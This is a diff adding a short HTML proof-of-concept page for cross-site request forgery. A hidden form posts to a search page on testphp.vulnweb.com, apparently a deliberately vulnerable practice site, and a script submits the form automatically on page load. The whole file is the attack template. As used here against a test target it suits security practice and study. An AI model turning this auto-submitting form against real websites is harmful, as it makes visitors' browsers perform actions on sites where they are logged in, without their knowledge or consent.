@@ -1,0 +1,22 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF PoC</title>
+</head>
+<body>
+    <h1>CSRF Proof of Concept</h1>
+    <p>This form will automatically submit when the page loads:</p>
+    <form id="csrf-form" action="http://testphp.vulnweb.com/search.php?test=query" method="post">
+        <input type="hidden" name="searchFor" value="">
+        <input type="hidden" name="goButton" value="go">
+
+    </form>
+    <script>
+        // Auto-submit the form when the page loads
+        window.onload = function() {
+            document.getElementById("csrf-form").submit();
+        }
+    </script>
+</body>
+</html>
